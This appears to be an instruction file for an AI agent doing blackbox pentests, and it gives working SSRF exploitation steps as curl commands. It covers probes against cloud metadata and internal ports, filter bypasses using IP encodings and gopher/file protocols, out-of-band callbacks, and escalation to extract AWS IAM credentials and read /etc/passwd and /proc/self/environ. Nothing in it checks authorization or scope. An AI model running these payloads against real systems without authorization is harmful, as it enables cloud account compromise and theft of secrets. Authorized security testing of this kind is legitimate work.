---
name: blackbox-ssrf
description: >-
  Actively test a target web application for Server-Side Request Forgery (SSRF)
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  identifies parameters that may trigger outbound HTTP requests (URL inputs,
  webhook fields, import features, image fetchers), injects SSRF payloads
  targeting cloud metadata services and internal hosts, and detects successful
  SSRF via response content, timing, or out-of-band DNS callbacks. Writes
  confirmed findings with PoC curl commands to pentest/ssrf-results.md. Use
  when asked to find SSRF in a blackbox pentest.
---

# Blackbox SSRF Detection

You are actively testing a web application for Server-Side Request Forgery without source code access. You will identify parameters that cause the server to make outbound HTTP requests and attempt to redirect those requests to internal/metadata services.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What You Are Looking For

SSRF occurs when you can make the server's HTTP client send requests to arbitrary URLs. Targets:
- **Cloud metadata**: `http://169.254.169.254/` (AWS/GCP/Azure IMDSv1), `http://100.100.100.200/` (Alibaba)
- **Internal services**: `http://localhost/`, `http://127.0.0.1/`, `http://10.0.0.1/`, `http://192.168.1.1/`
- **Internal ports**: Common services on `localhost` — databases, admin panels, monitoring

---

## Phase 1: Identify SSRF Candidates

Read `pentest/target-map.md` and find parameters that likely cause outbound HTTP requests:

**High-confidence SSRF parameters** (look for these exact names or similar):
- `url`, `link`, `src`, `source`, `href`, `fetch`, `load`, `import`, `target`
- `webhook`, `callback`, `notify`, `ping`, `endpoint`
- `redirect`, `next`, `return`, `returnUrl`, `returnTo`, `continue`
- `imageUrl`, `avatarUrl`, `thumbnail`, `icon`, `logo`, `image`
- `feed`, `rss`, `atom`, `proxy`, `remote`
- `path`, `file` (if value starts with `http://`)

**Feature-based SSRF targets**:
- PDF generation (convert webpage to PDF by URL)
- URL preview / link unfurling (show metadata/screenshot of a link)
- File import / upload via URL
- Image resize / fetch by URL
- Email-with-image features
- Webhook configuration (POST to user-specified URL)
- Server-side proxy features

Write candidates to `pentest/ssrf-recon.md`.

---

## Phase 2: Basic SSRF Probing

### Test 1: Cloud Metadata Services

For each SSRF candidate, inject AWS metadata URL:

```bash
# Direct parameter injection — AWS metadata
curl -sk -X POST "<TARGET_URL>/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Shortened variants (in case of basic URL validation)
curl -sk -X POST "<TARGET_URL>/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/"}'

# GCP metadata
curl -sk -X POST "<TARGET_URL>/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'

# Azure metadata
curl -sk -X POST "<TARGET_URL>/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
```

**Confirmed SSRF** if the response contains:
- AWS metadata keys like `ami-id`, `instance-id`, `security-credentials`, `iam`
- GCP token JSON with `access_token`
- Azure instance metadata JSON

### Test 2: Internal Network Probing

```bash
# Localhost services
curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://localhost/"

curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1/"

# Common internal services
curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:8080/"   # Alternative web port

curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:8500/"   # Consul

curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:9200/"   # Elasticsearch

curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:6379/"   # Redis (non-HTTP, look for different response)

curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://internal.company.com/"  # Internal hostname
```

**Signs of SSRF**:
- Server returns content from an internal service
- Error message reveals internal port/service (connection refused on port X — means the server tried to connect)
- Response time differs significantly (time-based probing)

### Test 3: Port Scanning via SSRF (timing-based)

If you can make the server attempt connections, you can infer open vs. closed ports via response timing:

```bash
# Open port — typically responds quickly
time curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:80/"

# Closed port — typically gets connection refused immediately
time curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:9999/"

# Filtered port — typically times out (slow)
time curl -sk -X POST "<TARGET_URL>/preview" \
  -d "url=http://127.0.0.1:22/"
```

---

## Phase 3: SSRF Filter Bypass Techniques

If the application blocks `127.0.0.1` or `169.254.169.254`, try these bypasses:

### IP Encoding Variants
```bash
# Decimal encoding
curl -sk "<TARGET_URL>/fetch?url=http://2130706433/"  # 127.0.0.1 in decimal

# Hex encoding
curl -sk "<TARGET_URL>/fetch?url=http://0x7f000001/"  # 127.0.0.1 in hex

# Octal
curl -sk "<TARGET_URL>/fetch?url=http://0177.0.0.1/"  # 127.0.0.1 in octal

# IPv6 loopback
curl -sk "<TARGET_URL>/fetch?url=http://[::1]/"
curl -sk "<TARGET_URL>/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/"

# URL with credentials
curl -sk "<TARGET_URL>/fetch?url=http://user@127.0.0.1/"

# Double slash/path tricks
curl -sk "<TARGET_URL>/fetch?url=http://attacker.com\\@127.0.0.1/"

# Subdomain pointing to 127.0.0.1 (common wildcard DNS services)
curl -sk "<TARGET_URL>/fetch?url=http://localtest.me/"
curl -sk "<TARGET_URL>/fetch?url=http://lvh.me/"
curl -sk "<TARGET_URL>/fetch?url=http://127.0.0.1.nip.io/"
```

### Protocol Variants
```bash
# file:// protocol (reads local files)
curl -sk "<TARGET_URL>/fetch?url=file:///etc/passwd"
curl -sk "<TARGET_URL>/fetch?url=file:///etc/hosts"

# dict:// protocol (talks to Redis, Memcached)
curl -sk "<TARGET_URL>/fetch?url=dict://127.0.0.1:6379/info"

# gopher:// protocol (send arbitrary TCP data)
curl -sk "<TARGET_URL>/fetch?url=gopher://127.0.0.1:6379/_INFO%0d%0a"

# ftp:// protocol
curl -sk "<TARGET_URL>/fetch?url=ftp://127.0.0.1/"
```

### Redirect-Based SSRF
If the parameter accepts URLs: Set up or use a redirect service to bypass validation:
```bash
# If you can create a redirect:
# http://attacker.com/redirect → 302 → http://169.254.169.254/latest/meta-data/
# Use shortener or httpbin:
curl -sk "<TARGET_URL>/fetch?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/"
```

---

## Phase 4: Out-of-Band Detection (Blind SSRF)

When the server doesn't reflect the response, use an out-of-band detection service:

Use `https://webhook.site` (or `https://requestbin.com`) — create a unique URL and inject it:

```bash
# Replace with your webhook.site URL
OAST_URL="https://webhook.site/unique-id-here"

curl -sk -X POST "<TARGET_URL>/webhook" \
  -H "Content-Type: application/json" \
  -d "{\"callback_url\":\"$OAST_URL\"}"

curl -sk "<TARGET_URL>/import?url=$OAST_URL"

# DNS-based detection using Burp Collaborator-style domains
# Replace with your unique Burp Collaborator or interactsh subdomain
curl -sk "<TARGET_URL>/fetch?url=http://abc123.oast.me/"
```

**Confirmed blind SSRF** if you receive a request at your out-of-band server.

---

## Phase 5: AWS Metadata Exploitation (if SSRF confirmed to 169.254.169.254)

If you confirm SSRF to the AWS metadata service, escalate:

```bash
# List all metadata
curl -sk -X POST "<TARGET_URL>/proxy" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Get IAM role name
curl -sk -X POST "<TARGET_URL>/proxy" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Get IAM credentials (replace ROLE_NAME with actual role name)
curl -sk -X POST "<TARGET_URL>/proxy" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"}'

# IMDSv2 (requires token first)
# Step 1: Get token
curl -sk -X POST "<TARGET_URL>/proxy" \
  -d '{"url":"http://169.254.169.254/latest/api/token","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}'
```

---

## Output Format

Write findings to `pentest/ssrf-results.md`:

```markdown
# SSRF Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed SSRF: [N]
- Blind SSRF: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED SSRF] /api/preview - url parameter

- **Endpoint**: `POST /api/preview`
- **Parameter**: `url` (JSON body)
- **Target**: AWS EC2 Instance Metadata Service (IMDS)
- **Impact**: CRITICAL — Read AWS IAM credentials, enabling full AWS account compromise
- **Evidence**: Response contains `ami-id`, `instance-id`, IAM role name returned from 169.254.169.254
- **PoC**:
  ```bash
  # Step 1: Confirm SSRF (metadata root)
  curl -sk -X POST "https://target.com/api/preview" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
  # Expected response: ami-id\nhostname\niam\n...

  # Step 2: Extract IAM role name
  curl -sk -X POST "https://target.com/api/preview" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
  # Expected: ec2-role-name

  # Step 3: Get credentials
  curl -sk -X POST "https://target.com/api/preview" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"}'
  # Expected: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
  ```
- **Remediation**: Validate and allowlist URLs to permitted domains only. Block access to 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. Use IMDSv2 which requires a PUT token request first.

### [BLIND SSRF] /webhooks - callback_url parameter

- **Endpoint**: `POST /webhooks`
- **Parameter**: `callback_url` (JSON body)
- **Evidence**: Out-of-band request received at webhook.site when injecting the OAST URL
- **Impact**: Server-side request forgery to arbitrary hosts; potential internal network scanning
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/webhooks" \
    -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"callback_url":"https://webhook.site/your-unique-id","event":"order.created"}'
  # Check webhook.site for incoming request
  ```
- **Remediation**: Validate callback URLs against an allowlist of trusted domains. Reject private/loopback/link-local IP ranges.
```

After writing results, delete `pentest/ssrf-recon.md`.

---

## Important Reminders

- SSRF to AWS metadata is immediately critical — escalate to IAM credential exfiltration.
- Blind SSRF (OOB only) is still a valid High severity finding.
- Test multiple bypass techniques if initial payloads are blocked.
- Note error messages carefully — "connection refused on 127.0.0.1:6379" confirms SSRF even without response content.
- If `file://` works, read `/etc/passwd` and `/proc/self/environ` for immediate impact demonstration.
- Clean up: delete `pentest/ssrf-recon.md` after writing results.
